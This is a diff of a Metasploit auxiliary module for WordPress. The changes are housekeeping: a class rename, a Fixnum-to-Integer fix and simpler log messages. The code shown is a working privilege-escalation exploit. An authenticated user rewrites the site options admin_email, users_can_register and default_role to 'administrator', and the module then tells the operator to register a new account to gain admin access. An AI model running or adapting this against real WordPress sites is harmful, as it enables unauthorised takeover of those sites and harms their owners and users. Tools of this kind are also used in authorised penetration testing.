@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
     case value
     when String, Symbol
       "s:#{value.bytesize}:\"#{value}\";"
-    when Fixnum
+    when Integer
       "i:#{value};"
     end
   end
@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
   def set_wp_option(name, value, cookie)
     encoded_value = serialize_and_encode(value)
     if encoded_value.nil?
-      vprint_error("#{peer} - Failed to serialize #{value}.")
+      vprint_error("Failed to serialize #{value}.")
     else
       res = send_request_cgi(
         'method'    => 'POST',
@@ -87,9 +87,9 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       if res.nil?
-        vprint_error("#{peer} - No response from the target.")
+        vprint_error("No response from the target.")
       else
-        vprint_warning("#{peer} - Server responded with status code #{res.code}") if res.code != 200
+        vprint_warning("Server responded with status code #{res.code}") if res.code != 200
       end
 
       return res
@@ -97,29 +97,29 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Authenticating with WordPress using #{username}:#{password}...")
+    print_status("Authenticating with WordPress using #{username}:#{password}...")
     cookie = wordpress_login(username, password)
     fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
-    print_good("#{peer} - Authenticated with WordPress")
+    print_good("Authenticated with WordPress")
 
     new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
-    print_status("#{peer} - Changing admin e-mail address to #{new_email}...")
+    print_status("Changing admin e-mail address to #{new_email}...")
     if set_wp_option('admin_email', new_email, cookie).nil?
       fail_with(Failure::UnexpectedReply, 'Failed to change the admin e-mail address')
     end
 
-    print_status("#{peer} - Enabling user registrations...")
+    print_status("Enabling user registrations...")
     if set_wp_option('users_can_register', 1, cookie).nil?
       fail_with(Failure::UnexpectedReply, 'Failed to enable user registrations')
     end
 
-    print_status("#{peer} - Setting the default user role...")
+    print_status("Setting the default user role...")
     if set_wp_option('default_role', 'administrator', cookie).nil?
       fail_with(Failure::UnexpectedReply, 'Failed to set the default user role')
     end
 
     register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
-    print_good("#{peer} - Privilege escalation complete")
-    print_good("#{peer} - Create a new account at #{register_url} to gain admin access.")
+    print_good("Privilege escalation complete")
+    print_good("Create a new account at #{register_url} to gain admin access.")
   end
 end
